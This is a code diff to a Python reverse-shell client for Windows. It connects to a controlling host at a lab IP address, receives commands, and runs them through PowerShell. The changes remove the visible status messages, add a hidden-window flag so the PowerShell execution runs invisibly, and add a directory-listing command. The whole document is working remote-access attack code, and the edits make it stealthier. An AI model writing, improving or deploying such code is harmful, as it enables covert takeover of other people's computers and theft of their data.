@@ -1,14 +1,12 @@
 import socket
-from subprocess import run
-from os import chdir, getcwd
+from subprocess import run, CREATE_NO_WINDOW
+from os import chdir, getcwd, listdir
 
 HOST = '192.168.56.1'
 PORT = 8888
 
 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as soc:
-    print(f"[*] Пытаюсь подключиться к {HOST}:{PORT} ...")
     soc.connect((HOST, PORT))
-    print("[+] Соединение установлено")
     
     while True:
         output = ''
@@ -23,9 +21,12 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as soc:
                 output = getcwd()
             except Exception as err:
                 output = f"[!] Ошибка перехода директории: {err}"
+        elif server_command.lower() == 'ls':
+            files = listdir('.')
+            output = '\n'.join(files)
         else:
             try:
-                result = run(['powershell', '-Command', f'chcp 65001 > $null; {server_command}'], capture_output=True, text=True, encoding='utf-8')
+                result = run(['powershell', '-Command', f'chcp 65001 > $null; {server_command}'], capture_output=True, text=True, encoding='utf-8', creationflags=CREATE_NO_WINDOW)
 
                 if result.stderr:
                     output += result.stderr
